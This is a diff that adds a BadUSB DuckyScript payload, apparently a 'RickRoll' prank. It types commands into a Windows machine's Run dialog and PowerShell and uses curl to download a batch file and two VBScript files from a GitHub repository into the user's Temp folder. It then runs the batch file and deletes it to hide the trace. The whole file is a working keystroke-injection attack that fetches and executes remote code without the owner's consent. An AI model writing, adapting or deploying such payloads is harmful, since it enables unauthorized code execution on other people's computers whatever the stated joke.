@@ -1,0 +1,40 @@
+GUI r
+DELAY 600
+STRING powershell
+ENTER
+DELAY 600
+STRING $user=[System.Environment]::UserName
+ENTER
+DELAY 150
+STRING $tmp="C:\Users\"+$user+"\AppData\Local\Temp"
+ENTER
+DELAY 150
+STRING cd $tmp
+ENTER
+DELAY 150
+STRING curl "https://raw.githubusercontent.com/ExpiredBeatle49/RickRoll_BadUsb/main/run.bat" -o Run.bat
+ENTER
+DELAY 600
+STRING cls
+ENTER
+DELAY 100
+STRING curl "https://raw.githubusercontent.com/ExpiredBeatle49/RickRoll_BadUsb/main/rollyou.vbs" -o rollyou.vbs
+ENTER
+DELAY 600
+STRING cls
+ENTER
+DELAY 100
+STRING curl "https://raw.githubusercontent.com/ExpiredBeatle49/RickRoll_BadUsb/main/volup.vbs" -o volup.vbs
+ENTER
+DELAY 600
+STRING cls
+ENTER
+DELAY 100
+STRING ./Run.bat
+ENTER
+DELAY 1500
+STRING del Run.bat
+ENTER
+DELAY 100
+STRING EXIT
+ENTER
